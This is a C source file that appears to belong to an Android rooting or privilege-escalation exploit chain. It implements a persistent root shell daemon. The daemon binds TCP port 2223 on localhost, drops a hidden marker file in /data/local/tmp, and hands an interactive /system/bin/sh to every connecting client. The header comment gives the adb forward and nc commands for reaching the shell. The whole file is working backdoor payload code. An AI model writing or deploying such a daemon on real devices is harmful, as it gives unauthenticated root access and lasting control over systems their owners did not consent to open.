/* rootshell.c — persistent root shell daemon (TCP 127.0.0.1:<ROOTSHELL_PORT>).
 *
 * Shared by the driver (cred path) and the `dnroot` UMH payload: both run it in
 * a normal uid-0 process, so /data has a working keyring (the UMH child's own
 * /data writes can fail with ENOKEY — this daemon runs in a forked child after
 * the keyring is warmed).
 * Reach it from a PC:  adb forward tcp:2223 tcp:2223 ; nc 127.0.0.1 2223
 */
#include "common.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void root_shell_daemon(void) {
  int port = 2223;
  const char *pe = getenv("ROOTSHELL_PORT");
  if (pe && *pe) port = atoi(pe);

  setsid();
  int s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) return;
  int one = 1;
  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in sa;
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons((uint16_t)port);
  sa.sin_addr.s_addr = htonl(0x7f000001);
  if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) return;
  if (listen(s, 8) != 0) return;

  for (int i = 0; i < 100; i++) {
    int mf = open("/data/local/tmp/.ghostlock_rootshell",
                  O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (mf >= 0) {
      char b[96];
      int n = snprintf(b, sizeof(b), "root shell 127.0.0.1:%d uid=%d euid=%d\n",
                       port, getuid(), geteuid());
      if (n > 0) { ssize_t w = write(mf, b, n); (void)w; }
      close(mf);
      break;
    }
    usleep(50000);
  }

  for (;;) {
    int c = accept(s, NULL, NULL);
    if (c < 0) continue;
    pid_t p = fork();
    if (p == 0) {
      dup2(c, 0); dup2(c, 1); dup2(c, 2);
      if (c > 2) close(c);
      close(s);
      execl("/system/bin/sh", "sh", "-i", (char *)NULL);
      _exit(127);
    }
    close(c);
    while (waitpid(-1, NULL, WNOHANG) > 0) { }
  }
}
